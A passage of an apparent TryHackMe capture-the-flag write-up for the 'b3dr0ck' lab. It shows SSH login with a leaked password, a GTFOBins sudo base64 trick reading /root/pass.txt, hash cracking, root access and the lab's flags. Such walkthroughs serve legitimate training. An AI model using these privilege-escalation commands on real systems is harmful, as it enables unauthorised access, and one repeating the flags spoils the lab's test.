+    |_|__,_|_.</strong>/|</em>.<strong>/ _<em>,</em>| |</strong><strong><em>/ _</em>,<em>|</em>.</strong>/|<em>.<strong>/ __,_| |</strong></em><strong>/ _</strong>/(_)</p>
+
+<p>Welcome: ‘fred’ is authorized.
+b3dr0ck&gt; help
+Password hint: YabbaDabbaD0000! (user = ‘fred’)
+b3dr0ck&gt;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>Then we were able to access the service again and retrieve password for user fred which is `YabbaDabbaD0000!` 
+### Escalate to user  Fred.
+Connect to `ssh`
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>┌──(egovridc㉿egovridc)-[~/C7F5/thm/Machine/b3dr0ck]                                                                                                                                                                                        <br />
+└─$ ssh fred@10.10.180.92                                                                                                                                                                                                                   <br />
+fred@10.10.180.92’s password:                                                                                                                                                                                                               <br />
+fred@b3dr0ck:~$</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>### Read Fred txt file.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>fred@b3dr0ck:~$ cat fred.txt                                                                                                                                                                                                                <br />
+THM{08da34e619da839b154521da7323559d}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>### Check what commands and services that user `Fred` can run with `sudo`.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>fred@b3dr0ck:~$ sudo -l                                                                                                                                                                                                                     <br />
+Matching Defaults entries for fred on b3dr0ck:
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</p>
+
+<p>User fred may run the following commands on b3dr0ck:
+    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>User `fred` can execute two import commands which are `base32` and `base64`.
+### Run commands to access decode the `/root/root.txt`.
+I search it form [gtfobins](https://gtfobins.github.io/gtfobins/base64/)and came across the follows: 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>LFILE=/root/pass.txt
+sudo base64 “$LFILE” | base64 –decode</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>The result obtained was the followings:
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>This can be decoded by using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true,false)) through the following steps:
+1.  Base32
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>2. Base64 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>a00a12aad6b7c16bf07032bd05a31d56</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>3. The final part is `md5` then crack it with `crackstation`
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>flintstonesvitamins</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>### Escalate to root user.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>fred@b3dr0ck:~$ su root
+Password: 
+root@b3dr0ck:/home/fred#</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>### Root Flag.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>root@b3dr0ck:/home/fred# cat /root/root.txt
+THM{de4043c009214b56279982bf10a661b7}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>The end.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Mungu nisaidie
+```</p>
+:ET
